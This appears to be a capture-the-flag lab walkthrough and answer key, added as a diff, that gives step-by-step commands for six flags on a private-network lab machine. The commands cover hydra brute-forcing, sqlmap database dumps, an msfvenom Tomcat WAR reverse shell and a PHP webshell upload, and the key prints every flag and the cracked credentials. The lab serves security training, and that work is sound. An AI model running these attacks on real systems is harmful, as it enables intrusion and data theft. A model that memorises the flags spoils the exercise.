@@ -1,0 +1,72 @@
+FLAG 1 — Brute Force
+1. Open Firefox on your VAPT machine and navigate to http://192.168.5.167
+2. Open a terminal and run:
+	hydra -l admin -P /usr/share/wordlist/rockyou.txt 172.22.1.167 http-post-form 	"/login.php:username=^USER^&password=^PASS^:S=dashboard.php" -V -f
+
+3. Note the cracked credentials: admin / purple1
+4. Go back to Firefox, enter admin / purple1, and click Access Workspace
+5. Scroll down on the webpage — FLAG1{BRUTE_FORCE_ADMIN_PURPLE1_LOGIN}
+6. Sign out of the website.
+
+FLAG 2 — SQL Injection
+1. Open a terminal and run:
+	sqlmap -u "http://192.168.5.167/login.php" --data="username=admin&password=purple1" -p username --batch --current-db
+
+2. Scroll down, and note the database name from the output (campus_ops). Now run:
+sqlmap -u "http://192.168.5.167/login.php" --data="username=admin&password=purple1" -p username --batch -D campus_ops --tables
+
+3. Note the users table. Now dump the user column:
+sqlmap -u "http://192.168.5.167/login.php" --data="username=admin&password=purple1" -p username --batch -D campus_ops -T users -C user --dump
+
+4. Scroll through the output: FLAG2{SQLMAP_DUMPED_USER_FIELD_FROM_DATABASE}
+
+FLAG 3 — Ransomware Encryption (Decrypt)
+1. Open Firefox, go to http://192.168.5.167, log in with admin / purple1
+2. Click on System Archives and note the two files listed
+3. Open a terminal and download both files:
+	wget http://192.168.5.167/backup/campus_archive_2026_05_31.enc
+   	wget http://172.22.1.167/backup/vault.key
+
+4. Decrypt the .enc file using OpenSSL:
+	openssl enc -d -aes-256-cbc -pbkdf2 -in campus_archive_2026_05_31.enc -out restored.txt -pass file:vault.key
+
+5. Read restored.txt — FLAG3{DIRECTORY_BACKUP_ARCHIVE_DECRYPTED}
+
+FLAG 4 — Apache Tomcat RCE (Reverse Shell)
+1. On the homepage of 192.168.5.167, click Application Console → Manager App
+2. Enter credentials admin / purple1 when the popup appears
+3. In a terminal, check your VAPT machine IP (the 192.168.5.X address):
+	ip a
+4. Start a Netcat listener in that terminal:
+	nc -lvnp 4444
+5. Open a second terminal and create the malicious WAR file (replace X with your IP octet):
+	msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.5.X LPORT=4444 -f war -o shell.war
+6. Back in Firefox (Tomcat Manager), click Browse, select shell.war, and click Deploy
+7. Click on the newly deployed /shell application in the Tomcat Manager list
+8. Switch to the terminal running the listener — you now have a reverse shell
+9. Run the following in the shell:
+	ls
+   	cat flag.txt
+10. Output contains — FLAG4{TOMCAT_MANAGER_WAR_REVERSE_SHELL_ACCESS}
+
+FLAG 5 — File Upload Vulnerability
+1. Create a PHP webshell:
+	sudo nano cmd.php
+Password: P@ssw0rd@1
+2. Type the following inside the file, then save and exit:
+	<?php system($_GET['cmd']); ?>
+3. Open Firefox, go to http://192.168.5.167, click Document Intake
+4. Browse to cmd.php, click Submit Document — note the upload path shown (you will get a notification below):
+	/var/www/internal/.service_cache
+5. Click on the storage path link that appears on the page
+6. In the URL bar, type:
+	http://192.168.5.167/storage/uploads/cmd.php?cmd=cat /var/www/internal/.service_cache
+7. Page output contains — FLAG5{FILE_UPLOAD_READ_INTERNAL_SERVICE_CACHE}
+
+FLAG 6 — APT32 Log Decryption (Base64)
+1. Open Firefox, go to http://192.168.5.167, click Endpoint Events
+2. Scroll to the bottom — find the source named proxy-01 with an event labeled session metadata containing a Base64 string
+3. Copy that Base64 string
+4. Open a terminal and decode it (replace the placeholder with the copied string):
+	echo -n "PASTE_BASE64_HERE" | base64 -d
+5. Decoded output contains — FLAG6{APT32_INTRUSION_THREAD_DECODED}
